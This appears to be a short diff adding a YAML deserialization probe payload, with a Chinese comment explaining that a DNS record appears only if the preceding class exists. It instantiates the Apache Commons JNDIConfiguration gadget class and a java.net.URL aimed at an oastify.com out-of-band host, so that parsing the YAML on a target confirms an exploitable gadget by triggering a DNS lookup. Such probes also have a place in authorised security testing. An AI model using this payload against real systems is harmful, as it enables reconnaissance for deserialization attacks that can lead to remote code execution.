@@ -1,0 +1,3 @@
+# 前面的类存在，后面才会有dns解析记录
+!!org.apache.commons.configuration.JNDIConfiguration {}: 0
+!!java.net.URL ["http://123JNDIConfiguration.sxt5r0ws82kg40ei6ffnrphraig942sr.oastify.com"]: 1
